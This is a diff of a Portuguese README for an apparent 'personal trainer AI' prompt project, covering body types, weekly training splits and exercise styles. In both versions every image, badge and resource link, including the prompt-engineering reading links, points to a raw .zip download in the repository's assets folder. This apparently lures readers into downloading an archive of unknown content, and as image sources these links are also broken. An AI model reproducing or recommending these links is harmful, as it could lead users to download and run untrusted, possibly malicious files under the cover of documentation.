@@ -1,12 +1,12 @@
 <p align="center">
-    <img width="300px" src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip">
+    <img width="300px" src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip">
 </p>
 
 <p align="center">
-<a href="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip"><img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" alt="DIO - Project"></a>
-<a href="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" title="Go to Bash homepage"><img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip;logoColor=white" alt="Made with Bash"></a>
-<a href="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" title="Powered by AWS">
-  <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip%20by-AWS-FED564?logo=icloud&logoColor=white" alt="Powered by AWS">
+<a href="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip"><img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" alt="DIO - Project"></a>
+<a href="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" title="Go to Bash homepage"><img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip;logoColor=white" alt="Made with Bash"></a>
+<a href="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" title="Powered by AWS">
+  <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip%20by-AWS-FED564?logo=icloud&logoColor=white" alt="Powered by AWS">
 </a>
 </p>
 
@@ -47,21 +47,21 @@ A primeira regra para personalizar o treino é determinar o biotipo corporal do 
   </tr>
   <tr>
     <td style="text-align: center;">
-      <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50%" height="50%">
+      <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50%" height="50%">
     </td>
     <td><strong>Ectomorfo</strong></td>
     <td>Corpo mais magro, difícil ganhar peso e massa muscular.</td>
   </tr>
   <tr>
     <td style="text-align: center;">
-      <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50%" height="50%">
+      <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50%" height="50%">
     </td>
     <td><strong>Mesomorfo</strong></td>
     <td>Corpo naturalmente musculoso, facilidade para ganhar massa muscular e perder gordura.</td>
   </tr>
   <tr>
     <td style="text-align: center;">
-      <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50%" height="50%">
+      <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50%" height="50%">
     </td>
     <td><strong>Endomorfo</strong></td>
     <td>Corpo com tendência a acumular gordura, maior dificuldade em perder peso.</td>
@@ -78,9 +78,9 @@ A segunda regra é determinar quantos dias por semana o usuário tem disponível
 
 | **Imagem**                                                     | **Dias por Semana** | **Tipo de Treino Sugerido** |
 | -------------------------------------------------------------- | ------------------- | --------------------------- |
-| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50" height="50"> | 1 dia               | Treino Full Body            |
-| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50" height="50"> | 3 dias              | Treino ABC                  |
-| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50" height="50"> | 5 dias              | Treino ABCDE                |
+| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50" height="50"> | 1 dia               | Treino Full Body            |
+| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50" height="50"> | 3 dias              | Treino ABC                  |
+| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50" height="50"> | 5 dias              | Treino ABCDE                |
 
 - **Full Body**: Treino que trabalha o corpo todo em uma única sessão.
 - **ABC**: Divisão do treino em três dias, cada um focado em grupos musculares diferentes.
@@ -94,11 +94,11 @@ A terceira regra envolve a escolha do tipo de exercício preferido. Aqui estão 
 
 | **Imagem**                                                       | **Tipo de Treino** | **Descrição**                                                                                                 |
 | ---------------------------------------------------------------- | ------------------ | ------------------------------------------------------------------------------------------------------------- |
-| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50%" height="50%"> | **Funcional**      | Exercícios que melhoram a funcionalidade do corpo, usando movimentos naturais.                                |
-| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50%" height="50%">  | **Maquinário**     | Exercícios feitos em máquinas, com foco em isolar grupos musculares.                                          |
-| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50%" height="50%">     | **Peso Livre**     | Exercícios com pesos livres, como halteres e barras, para trabalhar vários grupos musculares simultaneamente. |
-| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50%" height="50%">   | **Cardio**         | Exercícios voltados para melhorar a resistência cardiovascular, como corrida ou ciclismo.                     |
-| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip" width="50%" height="50%">     | **HIIT**           | Treinos intervalados de alta intensidade, ótimos para queima de gordura.                                      |
+| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50%" height="50%"> | **Funcional**      | Exercícios que melhoram a funcionalidade do corpo, usando movimentos naturais.                                |
+| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50%" height="50%">  | **Maquinário**     | Exercícios feitos em máquinas, com foco em isolar grupos musculares.                                          |
+| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50%" height="50%">     | **Peso Livre**     | Exercícios com pesos livres, como halteres e barras, para trabalhar vários grupos musculares simultaneamente. |
+| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50%" height="50%">   | **Cardio**         | Exercícios voltados para melhorar a resistência cardiovascular, como corrida ou ciclismo.                     |
+| <img src="https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip" width="50%" height="50%">     | **HIIT**           | Treinos intervalados de alta intensidade, ótimos para queima de gordura.                                      |
 
 ---
 
@@ -115,8 +115,8 @@ A terceira regra envolve a escolha do tipo de exercício preferido. Aqui estão 
 
 Aqui estão alguns recursos adicionais que podem ser úteis para entender melhor o projeto e as práticas de prompt engineering:
 
-- [Fundamentos de Engenharia de prompt](https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip)
-- [Boas práticas de prompt](https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/personal-challenger-ia-prompt-v3.8.zip)
+- [Fundamentos de Engenharia de prompt](https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip)
+- [Boas práticas de prompt](https://github.com/LucianoHMG/prompt-challenger-personal-ia/raw/refs/heads/main/.github/assets/prompt_challenger_personal_ia_2.2.zip)
 
 ---
 
